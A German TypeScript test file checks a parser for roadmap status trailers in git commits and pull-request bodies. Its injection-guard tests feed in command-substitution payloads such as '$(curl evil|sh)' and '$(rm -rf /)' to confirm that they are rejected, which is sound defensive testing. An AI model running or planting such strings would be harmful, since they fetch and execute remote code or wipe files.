// src/tests/plan-buchung.test.ts
import { parseBuchung, parseStatusTrailer, extractTrailerBlock, parseBuchungAusPrBody } from '../../scripts/plan/buchung';

describe('parseStatusTrailer', () => {
  it('parst "done" ohne Blocker', () => {
    expect(parseStatusTrailer('done')).toEqual({ status: 'done', blocker: null });
  });

  it('parst "ready" ohne Blocker', () => {
    expect(parseStatusTrailer('ready')).toEqual({ status: 'ready', blocker: null });
  });

  it('parst "parked(<token>)" mit Blocker-Token', () => {
    expect(parseStatusTrailer('parked(a33-flake)')).toEqual({ status: 'parked', blocker: 'a33-flake' });
  });

  it('trimmt umgebende Leerzeichen (git-Trailer-Wert)', () => {
    expect(parseStatusTrailer('  ready  ')).toEqual({ status: 'ready', blocker: null });
  });

  // §6.7-Rot-Fall: ungültiger Status wirft.
  it('wirft bei unbekanntem Status', () => {
    expect(() => parseStatusTrailer('erledigt')).toThrow(/ungültiger Wert "erledigt"/);
  });

  it('wirft bei wip/blocked (kein Merge-Trailer-Ergebnis)', () => {
    expect(() => parseStatusTrailer('wip')).toThrow(/ungültiger Wert "wip"/);
    expect(() => parseStatusTrailer('blocked')).toThrow(/ungültiger Wert "blocked"/);
  });

  it('wirft bei "parked" ohne Blocker-Token', () => {
    expect(() => parseStatusTrailer('parked')).toThrow(/verlangt ein Blocker-Token/);
    expect(() => parseStatusTrailer('parked()')).toThrow(/verlangt ein Blocker-Token/);
  });

  it('wirft bei Klammer-Zusatz ausserhalb von "parked"', () => {
    expect(() => parseStatusTrailer('done(x)')).toThrow(/nur bei "parked" erlaubt/);
  });

  it('wirft bei unlesbarem Wert', () => {
    expect(() => parseStatusTrailer('!!!')).toThrow(/unlesbar/);
  });
});

describe('parseBuchung', () => {
  it('kombiniert Roadmap- und Roadmap-Status-Trailer zu einer Buchung', () => {
    expect(parseBuchung('QS-PLAN-EINFACH', 'done')).toEqual({
      id: 'QS-PLAN-EINFACH',
      status: 'done',
      blocker: null,
    });
  });

  it('trägt den Blocker bei "parked" mit', () => {
    expect(parseBuchung('QS-CURRENCY-KANON', 'parked(warten-auf-david)')).toEqual({
      id: 'QS-CURRENCY-KANON',
      status: 'parked',
      blocker: 'warten-auf-david',
    });
  });

  it('wirft bei leerem ID-Trailer', () => {
    expect(() => parseBuchung('', 'done')).toThrow(/Trailer ist leer/);
    expect(() => parseBuchung('   ', 'done')).toThrow(/Trailer ist leer/);
  });

  it('wirft bei ungültigem Status-Trailer (Rot-Fall über die kombinierte Funktion)', () => {
    expect(() => parseBuchung('QS-PLAN-EINFACH', 'fertig')).toThrow(/ungültiger Wert "fertig"/);
  });
});

// Gegenprüfungs-Befund 14.8.2026 (Shell-Injection): ID/Token mit Metazeichen
// werden hart abgewiesen — §6.7-Rotfall der Zeichensatz-Wache.
describe('parseBuchung — Zeichensatz-Wache (Injection)', () => {
  it('wirft bei Metazeichen in der ID', () => {
    expect(() => parseBuchung('$(curl evil|sh)', 'done')).toThrow(/unerlaubte Zeichen/);
    expect(() => parseBuchung('W2·10;rm -rf', 'done')).toThrow(/unerlaubte Zeichen/);
  });
  it('wirft bei Metazeichen im Blocker-Token', () => {
    expect(() => parseBuchung('QS-DATA', 'parked($(id))')).toThrow(/unerlaubte Zeichen/);
  });
  it('lässt echte IDs und Tokens durch', () => {
    expect(parseBuchung('W2·10-UI-NAV', 'done')).toEqual({ id: 'W2·10-UI-NAV', status: 'done', blocker: null });
    expect(parseBuchung('QS-DATA', 'parked(vps-bestellung-david)')).toEqual({ id: 'QS-DATA', status: 'parked', blocker: 'vps-bestellung-david' });
  });
});

// Fallback (Lehre 14.8.2026, real bei PR #491): fehlt der Trailer im
// Squash-Commit (GitHub-Standard-Squash-Text bei mehreren Commits), wird die
// Buchungs-Absicht ersatzweise aus dem PR-Body gelesen.
describe('extractTrailerBlock', () => {
  it('liest den letzten Absatz als Trailer-Block, wenn jede Zeile "Key: value" ist', () => {
    const body = 'Beschreibung des PRs.\n\nMehr Fliesstext hier.\n\nRoadmap: QS-EFFIZIENZ\nRoadmap-Status: done';
    expect(extractTrailerBlock(body)).toEqual({ Roadmap: 'QS-EFFIZIENZ', 'Roadmap-Status': 'done' });
  });

  it('gibt ein leeres Objekt zurück, wenn der letzte Absatz gewöhnlicher Fliesstext ist', () => {
    const body = 'Roadmap: QS-EFFIZIENZ\nRoadmap-Status: done\n\nNoch ein Nachsatz ohne Trailer-Form.';
    expect(extractTrailerBlock(body)).toEqual({});
  });

  it('gibt ein leeres Objekt bei leerem Text zurück', () => {
    expect(extractTrailerBlock('')).toEqual({});
    expect(extractTrailerBlock('   ')).toEqual({});
  });

  it('mehrfacher Key: der letzte gewinnt (wie git interpret-trailers)', () => {
    const body = 'Roadmap: ALT\nRoadmap: NEU\nRoadmap-Status: ready';
    expect(extractTrailerBlock(body)).toEqual({ Roadmap: 'NEU', 'Roadmap-Status': 'ready' });
  });

  // Gegenprüfungs-Auflage B1-1 (14.8.2026): Haus-PR-Bodies enden auf den
  // Werkzeug-Footer — ohne Footer-Skip hätte der Anlass-PR #491 NIE gebucht.
  describe('Footer-Skip (B1-1)', () => {
    it('bucht aus einem REALEN Haus-Body: Trailer-Absatz gefolgt vom 🤖-Footer-Absatz', () => {
      const body =
        '## Inhalt\n\n' +
        'Vier Punkte umgesetzt, siehe Details oben.\n\n' +
        'Roadmap: QS-EFFIZIENZ\nRoadmap-Status: done\n\n' +
        '🤖 Generated with [Claude Code](https://claude.com/claude-code)';
      expect(extractTrailerBlock(body)).toEqual({ Roadmap: 'QS-EFFIZIENZ', 'Roadmap-Status': 'done' });
    });

    it('überspringt eine "---"-Trennlinie VOR dem Footer ebenfalls', () => {
      const body =
        'Text.\n\nRoadmap: QS-EFFIZIENZ\nRoadmap-Status: ready\n\n---\n\n' +
        '🤖 Generated with [Claude Code](https://claude.com/claude-code)';
      expect(extractTrailerBlock(body)).toEqual({ Roadmap: 'QS-EFFIZIENZ', 'Roadmap-Status': 'ready' });
    });

    it('Footer-only-Body (keine Buchungs-Absicht irgendwo) -> still, leeres Objekt', () => {
      const body = 'Beschreibung ohne jede Trailer-Absicht.\n\n🤖 Generated with [Claude Code](https://claude.com/claude-code)';
      expect(extractTrailerBlock(body)).toEqual({});
      expect(extractTrailerBlock('🤖 Generated with [Claude Code](https://claude.com/claude-code)')).toEqual({});
    });

    it('Absatz direkt vor dem Footer ist kein vollständiger Trailer-Block -> kein Treffer (kein Weitersuchen)', () => {
      const body =
        'Roadmap: QS-EFFIZIENZ\nRoadmap-Status: done\n\n' + // echter Trailer weiter vorn — zählt NICHT
        'Ein Nachsatz, der die Absicht nur erwähnt.\n\n' +
        '🤖 Generated with [Claude Code](https://claude.com/claude-code)';
      expect(extractTrailerBlock(body)).toEqual({});
    });
  });

  // Gegenprüfungs-Auflage B1-3 (14.8.2026): eingerückte Zeilen und Zeilen in
  // ``` -Fences zählen nie als Trailer-Zeilen.
  describe('Einrückung und Codeblöcke zählen nie als Trailer (B1-3)', () => {
    it('Sonden-Body mit 4-Leerzeichen-Einrückung bucht NICHT', () => {
      const body = 'Beispiel-Doku:\n\n    Roadmap: X\n    Roadmap-Status: done';
      expect(extractTrailerBlock(body)).toEqual({});
    });

    it('Trailer-Zeilen innerhalb eines ``` -Fences zählen nicht', () => {
      const body = 'Beispiel:\n\n```\nRoadmap: X\nRoadmap-Status: done\n```';
      expect(extractTrailerBlock(body)).toEqual({});
    });

    it('unindentierter echter Trailer-Block danach bucht weiterhin', () => {
      const body = '```\nBeispiel-Code\n```\n\nRoadmap: QS-EFFIZIENZ\nRoadmap-Status: done';
      expect(extractTrailerBlock(body)).toEqual({ Roadmap: 'QS-EFFIZIENZ', 'Roadmap-Status': 'done' });
    });
  });

  it('unbekannte Keys (nicht Roadmap/Roadmap-Status/Gegenpruefung) machen den Absatz ungültig', () => {
    const body = 'Text.\n\nRoadmap: QS-EFFIZIENZ\nRoadmap-Status: done\nSonstwas: X';
    expect(extractTrailerBlock(body)).toEqual({});
  });

  it('akzeptiert den dritten Haus-Key "Gegenpruefung" im selben Block', () => {
    const body = 'Text.\n\nRoadmap: W2·12-HYGIENE\nRoadmap-Status: done\nGegenpruefung: bestanden';
    expect(extractTrailerBlock(body)).toEqual({
      Roadmap: 'W2·12-HYGIENE',
      'Roadmap-Status': 'done',
      Gegenpruefung: 'bestanden',
    });
  });
});

describe('parseBuchungAusPrBody', () => {
  // (a) Fallback greift bei Standard-Squash-Text mit PR-Body-Trailer.
  it('bucht aus dem PR-Body, wenn der Commit-Trailer fehlt (Standard-Squash-Text)', () => {
    const body =
      '## Zusammenfassung\n\nDieser PR erledigt QS-EFFIZIENZ Punkt 3.\n\n' +
      'Roadmap: QS-EFFIZIENZ\nRoadmap-Status: done';
    expect(parseBuchungAusPrBody(body)).toEqual({ id: 'QS-EFFIZIENZ', status: 'done', blocker: null });
  });

  it('bucht "parked(<token>)" mit Blocker aus dem PR-Body', () => {
    const body = 'Text.\n\nRoadmap: QS-CURRENCY-KANON\nRoadmap-Status: parked(warten-auf-david)';
    expect(parseBuchungAusPrBody(body)).toEqual({
      id: 'QS-CURRENCY-KANON',
      status: 'parked',
      blocker: 'warten-auf-david',
    });
  });

  // (c) kein Trailer nirgends -> still (null, kein Wurf).
  it('gibt null zurück, wenn der PR-Body gar keine Buchungs-Absicht trägt', () => {
    expect(parseBuchungAusPrBody('Nur eine gewöhnliche PR-Beschreibung ohne Trailer.')).toBeNull();
    expect(parseBuchungAusPrBody('')).toBeNull();
  });

  // FACHLICHE ÄNDERUNG 15.8.2026 (deklariert, §6.3): ein HALBER Buchungs-Block
  // verpuffte bis dahin still — Realfall PR #507: `Roadmap:` und
  // `Roadmap-Status:` durch Leerzeile getrennt, nur der letzte Absatz zählte
  // als Block, Workflow endete «success» ohne Push, Hand-Buchung nötig.
  // Seither gilt: erkennbare, aber unvollständige Buchungs-Absicht => Wurf.
  it('wirft bei halbem Buchungs-Block (nur einer der beiden Trailer)', () => {
    expect(() => parseBuchungAusPrBody('Text.\n\nRoadmap: QS-EFFIZIENZ')).toThrow(/unvollständiger Buchungs-Block/);
    // der exakte #507-Fall: beide Trailer da, aber in GETRENNTEN Absätzen —
    // nur der letzte (status-only) zählt als Block => laut, nie still.
    expect(() => parseBuchungAusPrBody('Text.\n\nRoadmap: QS-EFFIZIENZ\n\nRoadmap-Status: ready\n\n🤖 Generated with [Claude Code](https://claude.com/claude-code)'))
      .toThrow(/unvollständiger Buchungs-Block/);
  });

  // (b) Injection-Probe im PR-Body wird verworfen — läuft durch dieselbe
  // Zeichensatz-Wache wie der Commit-Trailer-Pfad.
  it('wirft bei einem Injection-Versuch im Blocker-Token des PR-Body-Trailers', () => {
    const body = 'Text.\n\nRoadmap: QS-DATA\nRoadmap-Status: parked($(curl evil.sh|sh))';
    expect(() => parseBuchungAusPrBody(body)).toThrow(/unerlaubte Zeichen/);
  });

  it('wirft bei einem Injection-Versuch in der ID des PR-Body-Trailers', () => {
    const body = 'Text.\n\nRoadmap: $(rm -rf /)\nRoadmap-Status: done';
    expect(() => parseBuchungAusPrBody(body)).toThrow(/unerlaubte Zeichen/);
  });

  it('wirft bei ungültigem Status im PR-Body-Trailer (§6.7-Rotfall)', () => {
    const body = 'Text.\n\nRoadmap: QS-EFFIZIENZ\nRoadmap-Status: fertig';
    expect(() => parseBuchungAusPrBody(body)).toThrow(/ungültiger Wert "fertig"/);
  });
});
